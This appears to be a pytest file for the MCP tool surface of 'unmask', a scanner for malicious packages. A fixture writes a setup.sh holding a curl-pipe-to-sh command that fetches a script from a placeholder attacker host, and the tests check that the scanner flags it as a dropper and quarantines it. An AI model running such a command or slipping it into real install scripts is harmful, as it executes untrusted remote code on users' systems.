"""MCP surface — the tools an agent drives unmask through.

The plain logic functions are tested directly (no MCP client needed); a construction
test confirms the server registers the expected tools.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

_CURL_PIPE_SH = "#!/bin/sh\ncurl -fsSL https://evil.example/install.sh | sh\n"


def _pkg(tmp_path):
    d = tmp_path / "pkg"
    d.mkdir()
    (d / "setup.sh").write_text(_CURL_PIPE_SH)
    return d


def test_scan_tool_returns_agent_summary(tmp_path):
    from unmask.mcp_server import scan_target
    out = scan_target(str(_pkg(tmp_path)), storage_root=str(tmp_path / ".mcd"))
    assert out["disposition"] == "quarantine"
    assert "BP-DROPPER" in (out["compositions"] or [])
    assert out["findingCount"] >= 1
    f = out["findings"][0]
    assert set(f) >= {"composition", "severity", "confidence", "title", "locations"}
    assert any("setup.sh" in loc for loc in f["locations"])
    # coverage/blind-spot info is surfaced for the agent
    assert "reProvidersInstalled" in out["coverage"]
    # run identity lets the agent resume / fetch the report later
    assert out["runDir"] and out["runId"] and out["status"] == "completed"


def test_scan_rejects_unsafe_network(tmp_path):
    from unmask.mcp_server import scan_target
    with pytest.raises(ValueError):
        scan_target(str(_pkg(tmp_path)), network="dynamic", storage_root=str(tmp_path / ".mcd"))


def test_report_and_status_and_list(tmp_path):
    from unmask.mcp_server import list_runs, read_report, run_status, scan_target
    out = scan_target(str(_pkg(tmp_path)), storage_root=str(tmp_path / ".mcd"))
    run_dir = out["runDir"]

    md = read_report(run_dir, "md")
    assert isinstance(md, str) and "MCD" in md.upper() or "disposition" in md.lower()
    rep = read_report(run_dir, "json")
    assert isinstance(rep, dict) and rep["disposition"]["recommendation"] == "quarantine"
    with pytest.raises(ValueError):
        read_report(run_dir, "pdf")

    st = run_status(run_dir)
    assert st["runId"] == out["runId"]

    runs = list_runs(str(tmp_path / ".mcd"))
    assert any(r["runId"] == out["runId"] for r in runs)


def test_resume_tool_reuses_run(tmp_path):
    from unmask.mcp_server import resume_run, scan_target
    out = scan_target(str(_pkg(tmp_path)), storage_root=str(tmp_path / ".mcd"))
    again = resume_run(out["runDir"])
    assert again["runId"] == out["runId"]
    assert again["disposition"] == out["disposition"]
    assert again["compositions"] == out["compositions"]


def test_toolchain_status():
    from unmask.mcp_server import toolchain_status
    rep = toolchain_status()
    assert "reProvidersInstalled" in rep and "providers" in rep


def test_summarize_report_bounds_and_shapes():
    from unmask.mcp_server import summarize_report
    report = {
        "disposition": {"recommendation": "review", "rationale": "why"},
        "summary": {"findingCount": 1, "compositions": ["BP-X"], "highestSeverity": "high"},
        "observations": [{"id": "obs-1", "location": {"path": "a.py"}}],
        "findings": [{"id": "mcd-1", "composition": "BP-X", "severity": "high",
                      "confidence": 0.7, "title": "t", "claim": "c", "evidence": ["obs-1"]}],
        "toolchain": {"reProvidersInstalled": False, "hint": "install unmask-re"},
    }
    s = summarize_report(report)
    assert s["disposition"] == "review"
    assert s["findings"][0]["locations"] == ["a.py"]
    assert s["coverage"]["reProvidersInstalled"] is False


def test_build_server_registers_tools():
    import asyncio

    from unmask.mcp_server import build_server
    server = build_server()
    names = {t.name for t in asyncio.run(server.list_tools())}
    assert {"scan", "resume", "get_report", "status", "list_scans", "re_toolchain"} <= names


def test_scan_over_real_mcp_session(tmp_path):
    """Drive `scan` through an actual MCP client session — exercises the protocol and
    the run_sync-in-a-worker-thread offload (a scan can't nest in the server loop)."""
    import asyncio

    from unmask.mcp_server import build_server

    async def drive():
        from mcp.shared.memory import create_connected_server_and_client_session as connect
        async with connect(build_server()._mcp_server) as client:
            res = await client.call_tool(
                "scan", {"target": str(_pkg(tmp_path)), "storage_root": str(tmp_path / ".mcd")})
            assert res.isError is False
            payload = res.structuredContent or json.loads(res.content[0].text)
            return payload

    out = asyncio.run(drive())
    assert out["disposition"] == "quarantine"
    assert "BP-DROPPER" in (out["compositions"] or [])
